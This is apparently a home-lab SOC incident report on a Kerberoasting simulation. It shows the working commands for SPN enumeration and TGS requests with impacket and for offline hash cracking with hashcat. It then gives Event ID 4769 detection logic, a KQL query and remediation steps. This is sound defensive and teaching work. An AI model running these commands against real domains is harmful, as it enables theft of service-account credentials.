# INC-003 — Kerberoasting

> **Status:** ✅ Complete  
> **Date:** 2026-08-20  
> **MITRE ATT&CK:** [T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)  
> **Tactic:** Credential Access  
> **Severity:** High  

---

## Summary

A domain user account (`svc_asrep`) requested a Kerberos service ticket (TGS) for the `svc_http` service account, which had a registered Service Principal Name (SPN). The resulting RC4-encrypted TGS ticket was captured offline and successfully cracked with Hashcat in the isolated lab environment, demonstrating that weak service-account passwords combined with RC4 encryption create a significant offline cracking risk.

The domain controller generated Security Event ID `4769` with `TicketEncryptionType: 0x17` (RC4), which was ingested into ELK and confirmed as the primary detection signal.

---

## Environment

| Component | Value |
|-----------|-------|
| Domain | `SOC.LAB` |
| Domain Controller | `SOC-Lab-DC` / `172.16.0.5` |
| Attacker (Kali) | `172.16.0.11` |
| Requesting account | `svc_asrep@SOC.LAB` |
| Target service account | `svc_http` |
| Target SPN | `HTTP/soc-lab-dc.soc.lab` |
| Service SID | `S-1-5-21-1701489040-3636485218-699737683-1105` |

---

## Attack Walkthrough

### 1. Service Account Setup (DC)

A dedicated service account with a registered SPN was created on the domain controller:

```powershell
New-ADUser -Name "svc_http" \
  -AccountPassword (ConvertTo-SecureString "<redacted>" -AsPlainText -Force) \
  -Enabled $true

Set-ADUser svc_http -ServicePrincipalNames @{Add="HTTP/soc-lab-dc.soc.lab"}
```

This makes `svc_http` a valid Kerberoastable target — any authenticated domain user can now request a TGS encrypted with its password hash.

### 2. SPN Enumeration + TGS Request (Kali)

```bash
impacket-GetUserSPNs soc.lab/svc_asrep:'<redacted>' \
  -dc-ip 172.16.0.5 \
  -request \
  -outputfile kerberoast.hash
```

Impacket authenticated as `svc_asrep`, enumerated all accounts with SPNs, and requested a TGS for `svc_http`. The resulting Kerberos 5 TGS-REP hash (`$krb5tgs$23$*`) was written to `kerberoast.hash`.

> **Note:** The raw hash and cracked credential are intentionally excluded from version control.

### 3. Offline Cracking (Kali — Hashcat)

```bash
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
```

| Field | Value |
|-------|-------|
| Hashcat mode | `13100` (Kerberos 5 TGS-REP RC4) |
| Wordlist | `rockyou.txt` |
| Result | **1/1 cracked** |
| Recovered credential | Redacted |

---

## Detection

### Primary Signal — Event ID 4769

The domain controller generated the following event at `2026-08-20T21:37:57.973Z`:

| Field | Value |
|-------|-------|
| Event ID | `4769` |
| Action | Kerberos Service Ticket Operations |
| Outcome | Success |
| Account | `svc_asrep@SOC.LAB` |
| Service Name | `svc_http` |
| Ticket Encryption Type | `0x17` (RC4-HMAC) |
| Client Address | `::ffff:172.16.0.11` |
| Failure Code | `0x0` |
| ELK Index | `winlogbeat-2026.08.20` |
| Record ID | `52849` |

### Key Detection Logic

RC4 encryption type `0x17` on a TGS is the primary indicator. In a hardened environment, all tickets should use AES (`0x12` or `0x11`). A request for `0x17` means either:

1. The service account only supports RC4 (weak account configuration), or
2. The attacker explicitly downgraded to RC4 to enable offline cracking.

### ELK Query (KQL)

```kql
event.code: "4769"
AND winlog.event_data.TicketEncryptionType: "0x17"
AND winlog.event_data.ServiceName: *
AND NOT winlog.event_data.ServiceName: ("krbtgt" OR "*$")
```

### Sigma Rule

See [`detection/sigma/T1558.003-kerberoasting.yml`](../../detection/sigma/T1558.003-kerberoasting.yml)

---

## Evidence Index

| # | Type | Description | Sensitive? |
|---|------|-------------|------------|
| 1 | Windows Event | EID 4769 — TGS-REP for `svc_http` from `172.16.0.11` | No |
| 2 | ELK Record | `winlogbeat-2026.08.20` record `52849` | No |
| 3 | Hashcat output | 1/1 recovered — mode 13100 | **Yes — local only** |
| 4 | Raw hash | `$krb5tgs$23$*svc_http*` | **Yes — local only** |
| 5 | Cracked credential | Plaintext password | **Yes — local only** |

> Sensitive artefacts remain on the isolated Kali host and are excluded from version control via `.gitignore`.

---

## Why RC4 Makes This Dangerous

Kerberos tickets encrypted with RC4 (`0x17`) are crackable offline because the encryption key is derived directly from the service account's NTLM hash (the password). An attacker can capture the ticket over the network with zero interaction from the service account, and crack it later at their own pace using a GPU. AES-encrypted tickets (`0x12`) are derived from a salted key, which is significantly harder to crack.

---

## Remediation

- **Disable RC4 for Kerberos** on service accounts where AES is supported (`msDS-SupportedEncryptionTypes`).
- **Use long randomly generated passwords** (25+ characters) for service accounts — offline cracking becomes infeasible.
- **Prefer Group Managed Service Accounts (gMSA)** — passwords are automatically managed and rotated by the domain.
- **Monitor EID 4769** for RC4 ticket requests (`TicketEncryptionType: 0x17`) targeting non-machine service accounts.
- **Alert on volume spikes** — an attacker dumping all SPNs at once will produce many `4769` events in a short window.
- **Rotate the lab service account credential** after testing is complete.

---

## References

- [MITRE ATT&CK T1558.003](https://attack.mitre.org/techniques/T1558/003/)
- [Microsoft EID 4769 Documentation](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769)
- [Impacket GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
- [Hashcat mode 13100](https://hashcat.net/wiki/doku.php?id=hashcat)
- [RFC 4120 — The Kerberos Network Authentication Service (V5)](https://www.rfc-editor.org/rfc/rfc4120)
